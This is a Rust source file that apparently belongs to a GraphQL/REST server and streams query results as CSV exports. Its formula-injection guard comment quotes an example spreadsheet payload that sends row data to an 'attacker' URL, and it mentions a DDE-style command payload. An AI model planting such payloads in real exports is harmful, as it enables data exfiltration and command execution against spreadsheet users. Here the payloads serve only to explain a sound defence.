//! CSV streaming response handler for the REST transport.
//!
//! When a client sends `Accept: text/csv`, the GET handler delegates to this
//! module. Like NDJSON, CSV is streamed in `O(batch_size)` memory rather than
//! buffering the full result set.
//!
//! Output format:
//! - Optional UTF-8 BOM (`\u{FEFF}`) at the start, controlled by [`ExportConfig::csv_include_bom`]
//!   (default `true` — Excel needs it).
//! - One header row naming the columns the rows were **projected** by, in that order (#1274). With
//!   `?select=a,b,c` that is the selection; without one it is the type's declared fields. Only if
//!   the projection is empty — a return type absent from the schema — does the header fall back to
//!   the first row's keys, sorted alphabetically (deterministic regardless of `serde_json`'s
//!   `preserve_order` feature).
//! - One row per result, RFC 4180 quoting, configurable delimiter via
//!   [`ExportConfig::csv_delimiter`].
//!
//! Scalar values map to their string form; `Null` becomes an empty cell;
//! arrays and objects (embedded relationships) are JSON-serialised into a
//! single cell.
//!
//! Gated behind the `export-csv` Cargo feature.

use axum::http::{HeaderMap, HeaderValue};
use bytes::Bytes;
use fraiseql_core::{db::traits::DatabaseAdapter, security::SecurityContext};
use futures::{StreamExt as _, stream};

use super::{
    super::{
        export_config::ExportConfig,
        handler::{ResolvedGetQuery, RestError, RestHandler, set_request_id},
    },
    guard_formula_injection,
    helpers::determine_columns,
};

/// Content type for CSV responses.
pub const CSV_CONTENT_TYPE: &str = "text/csv";

/// Check whether an `Accept` header value requests CSV.
#[must_use]
pub fn accepts_csv(headers: &HeaderMap) -> bool {
    headers.get("accept").and_then(|v| v.to_str().ok()).is_some_and(|accept| {
        accept.split(',').any(|part| {
            // Strip any parameters (`;q=0.5`, `;charset=utf-8`, etc.).
            let media = part.split(';').next().unwrap_or(part).trim();
            media.eq_ignore_ascii_case(CSV_CONTENT_TYPE)
        })
    })
}

/// Execute a query and return results as a streaming CSV response.
///
/// Mirrors [`super::handle_ndjson_get`]: rows are fetched in batches of
/// `rest_config.ndjson_batch_size`, serialised, and streamed to the client.
/// The first batch emits an optional UTF-8 BOM and a header row; subsequent
/// batches emit only data rows.
///
/// # Errors
///
/// Returns `RestError` on route resolution, parameter extraction, or initial
/// query setup failure. Errors that occur mid-stream are emitted as a final
/// CSV record `# error: <message>` (the leading `#` and the absence of the
/// configured delimiter make the line clearly distinguishable from data).
pub async fn handle_csv_get<A: DatabaseAdapter + 'static>(
    handler: &RestHandler<'_, A>,
    export_config: &ExportConfig,
    relative_path: &str,
    query_pairs: &[(&str, &str)],
    headers: &HeaderMap,
    security_context: Option<&SecurityContext>,
) -> Result<CsvResponse, RestError> {
    // Count, pagination and the `?select=` embeds and counts of #1268 are all refused by
    // `resolve_streaming_get_query`, the one function every export representation
    // resolves through.
    let resolved = handler.resolve_streaming_get_query(relative_path, query_pairs, headers)?;

    let ResolvedGetQuery {
        query_name,
        query_match,
        variables,
        params,
        ..
    } = resolved;

    let mut response_headers = HeaderMap::new();
    set_request_id(headers, &mut response_headers);
    response_headers.insert("content-type", HeaderValue::from_static(CSV_CONTENT_TYPE));

    let filename = sanitize_filename(&query_name);
    let disposition = if filename.is_empty() {
        "attachment; filename=\"export.csv\"".to_string()
    } else {
        format!("attachment; filename=\"{filename}.csv\"")
    };
    response_headers.insert(
        "content-disposition",
        HeaderValue::from_str(&disposition)
            .unwrap_or_else(|_| HeaderValue::from_static("attachment; filename=\"export.csv\"")),
    );

    let batch_size = handler.config().ndjson_batch_size.max(1);

    // #1274: the header is the projection, read before `export_rows` consumes the match.
    let select_columns = super::helpers::export_columns(&query_match);

    // One statement for the whole export (#958) — see `helpers::export_rows`.
    let rows = super::helpers::export_rows(
        handler.executor(),
        query_match,
        variables,
        security_context.cloned(),
        // `?limit=` caps the export total, read from what the client sent rather than
        // from the resolved plan, which fills an absent one with `default_page_size` (#811).
        params.requested_pagination.limit,
    )
    .await?;

    let csv_stream = stream::unfold(
        CsvStreamState {
            chunks: rows.ready_chunks(usize::try_from(batch_size).unwrap_or(usize::MAX)),
            delimiter: ascii_delimiter(export_config.csv_delimiter),
            include_bom: export_config.csv_include_bom,
            select_columns,
            columns: None,
            header_emitted: false,
            finished: false,
        },
        |mut state| async move {
            if state.finished {
                return None;
            }
            let bytes = serialize_next_csv_chunk(&mut state).await?;
            Some((Ok(bytes), state))
        },
    );

    Ok(CsvResponse {
        headers: response_headers,
        body:    CsvBody::Stream(Box::pin(csv_stream)),
    })
}

/// Reduce a query name to characters safe inside an HTTP filename token.
///
/// Keeps ASCII alphanumerics plus `_` and `-`; drops everything else.
fn sanitize_filename(name: &str) -> String {
    name.chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '-')
        .collect()
}

/// CSV streaming response.
pub struct CsvResponse {
    /// Response headers (content-type, content-disposition, request-id).
    pub headers: HeaderMap,
    /// CSV body — currently always a stream.
    pub body:    CsvBody,
}

/// Body of a CSV response.
#[non_exhaustive]
pub enum CsvBody {
    /// Streaming body (batched execution).
    Stream(
        std::pin::Pin<
            Box<dyn futures::Stream<Item = Result<Bytes, std::convert::Infallible>> + Send>,
        >,
    ),
}

impl CsvBody {
    /// Convert to an axum `Body`.
    pub fn into_body(self) -> axum::body::Body {
        match self {
            Self::Stream(stream) => axum::body::Body::from_stream(stream),
        }
    }
}

// ---------------------------------------------------------------------------
// Streaming internals
// ---------------------------------------------------------------------------

/// Internal state carried through the CSV unfold loop.
struct CsvStreamState {
    /// Row groups from the export's single statement (#958).
    chunks:         futures::stream::ReadyChunks<fraiseql_core::runtime::JsonRowStream>,
    delimiter:      u8,
    include_bom:    bool,
    /// The projection's columns, from `helpers::export_columns` (#1274). `None` means
    /// the projection was empty — infer from the first row's keys, sorted.
    select_columns: Option<Vec<String>>,
    /// Column list finalised on the first non-empty group.
    columns:        Option<Vec<String>>,
    /// Tracks whether the header row has been written yet.
    header_emitted: bool,
    /// Set once a terminal payload (the error line, or the header-only body) has
    /// been emitted, so the next poll ends the stream instead of repeating it.
    finished:       bool,
}

/// Serialise the next group of rows as CSV bytes, or `None` when the export is
/// complete.
///
/// On the first non-empty group this writes the optional BOM and the header row.
async fn serialize_next_csv_chunk(state: &mut CsvStreamState) -> Option<Bytes> {
    let Some(chunk) = state.chunks.next().await else {
        // No rows at all. A header-only body is still a correct CSV export, and is what
        // a spreadsheet expects to open. This used to be withheld unless the client sent
        // a `?select=`, because there was otherwise "no column list to write"; taking the
        // header from the projection (#1274) means there always is one.
        if !state.header_emitted {
            if let Some(cols) = state.select_columns.clone() {
                state.columns = Some(cols.clone());
                state.finished = true;
                state.header_emitted = true;
                return Some(
                    write_csv_payload(&cols, &[], state.delimiter, state.include_bom, true)
                        .unwrap_or_else(|err| err),
                );
            }
        }
        return None;
    };

    let mut rows = Vec::with_capacity(chunk.len());
    let mut failure = None;
    for row in chunk {
        match row {
            Ok(row) => rows.push(row),
            Err(e) => {
                failure = Some(e.to_string());
                break;
            },
        }
    }

    if state.columns.is_none() && !rows.is_empty() {
        state.columns = Some(determine_columns(state.select_columns.as_deref(), &rows));
    }

    let mut bytes = if let Some(columns) = state.columns.clone() {
        let emit_header = !state.header_emitted;
        state.header_emitted = true;
        match write_csv_payload(
            &columns,
            &rows,
            state.delimiter,
            state.include_bom && emit_header,
            emit_header,
        ) {
            Ok(b) => b.to_vec(),
            Err(err) => {
                state.finished = true;
                return Some(err);
            },
        }
    } else {
        Vec::new()
    };

    // Rows that were serialised before the failure still go out — a truncated
    // export that says why is recoverable, one that just ends is not.
    if let Some(message) = failure {
        bytes.extend_from_slice(&error_csv_line(&message));
        state.finished = true;
    }

    Some(Bytes::from(bytes))
}

/// Stateless CSV chunk writer. Shared by [`serialize_batch`] and the unit
/// tests.
///
/// - `emit_bom`: prepend the UTF-8 BOM bytes.
/// - `emit_header`: write the column header row before any data rows.
///
/// csv-writer errors are converted into the same `# error:` line format used
/// for mid-stream failures, so the caller can pass them through the stream.
fn write_csv_payload(
    columns: &[String],
    rows: &[serde_json::Value],
    delimiter: u8,
    emit_bom: bool,
    emit_header: bool,
) -> Result<Bytes, Bytes> {
    let mut buf: Vec<u8> = Vec::new();
    if emit_bom {
        buf.extend_from_slice("\u{FEFF}".as_bytes());
    }

    {
        let mut wtr = csv::WriterBuilder::new().delimiter(delimiter).from_writer(&mut buf);

        if emit_header {
            wtr.write_record(columns.iter().map(String::as_str))
                .map_err(|e| error_csv_line(&e.to_string()))?;
        }

        for row in rows {
            let record: Vec<String> = columns
                .iter()
                .map(|c| value_to_csv_field(row.get(c).unwrap_or(&serde_json::Value::Null)))
                .collect();
            wtr.write_record(record.iter().map(String::as_str))
                .map_err(|e| error_csv_line(&e.to_string()))?;
        }

        wtr.flush().map_err(|e| error_csv_line(&e.to_string()))?;
    }

    Ok(Bytes::from(buf))
}

/// Build a clearly-marked error line for mid-stream failures.
///
/// The leading `# error:` keeps the line distinguishable from real CSV data
/// regardless of the configured delimiter — RFC 4180 has no comment syntax,
/// but consumers can grep this prefix to detect a truncated export.
fn error_csv_line(message: &str) -> Bytes {
    // Strip newlines so the marker stays on one line; readers tail-scanning
    // for it shouldn't have to handle multi-line errors.
    let one_line: String = message.chars().map(|c| if c == '\n' { ' ' } else { c }).collect();
    Bytes::from(format!("# error: {one_line}\n"))
}

/// Convert a JSON cell to its CSV string representation.
///
/// Scalar values use their natural string form; `Null` becomes empty; arrays
/// and objects (e.g. embedded relationships) are emitted as their JSON
/// representation inside a single cell. The csv writer handles quoting and
/// escaping based on the delimiter.
///
/// **CSV / formula-injection guard.** Any string-shaped output that starts
/// with one of `=`, `+`, `-`, `@`, `\t`, `\r` is prefixed with a single
/// quote so spreadsheet applications (Excel, `LibreOffice`, Numbers) render
/// it as a literal cell value rather than parsing it as a formula or
/// macro on open.  Without this guard, a cell containing
/// `=HYPERLINK("http://attacker/?leak="&A1,"click")` exfiltrates row data
/// to an attacker-controlled URL when the user opens the export. The
/// prefix character is the standard OWASP mitigation; downstream tooling
/// that wants the raw value sees the leading `'` and must strip it.
fn value_to_csv_field(v: &serde_json::Value) -> String {
    match v {
        serde_json::Value::Null => String::new(),
        serde_json::Value::Bool(b) => b.to_string(),
        // Numbers are emitted in their JSON canonical form. `serde_json::Number`
        // cannot produce a leading dangerous character (only digits, `-`, `.`,
        // and `e/E`); we still guard for `-` because `-2=1+cmd|...` is a
        // documented attack and a negative number leading with `-` lets it
        // sneak through the parser-level filter Excel applies to numeric cells.
        serde_json::Value::Number(n) => guard_formula_injection(&n.to_string()),
        serde_json::Value::String(s) => guard_formula_injection(s),
        other => guard_formula_injection(&serde_json::to_string(other).unwrap_or_default()),
    }
}

/// Coerce a `char` delimiter into the single byte the csv writer expects.
///
/// Falls back to comma when the configured delimiter is not a single ASCII
/// byte — `csv::WriterBuilder::delimiter` rejects multi-byte delimiters at
/// runtime, so this guard keeps the writer constructible.
const fn ascii_delimiter(c: char) -> u8 {
    if c.is_ascii() && c.len_utf8() == 1 {
        c as u8
    } else {
        b','
    }
}

#[cfg(test)]
mod tests;
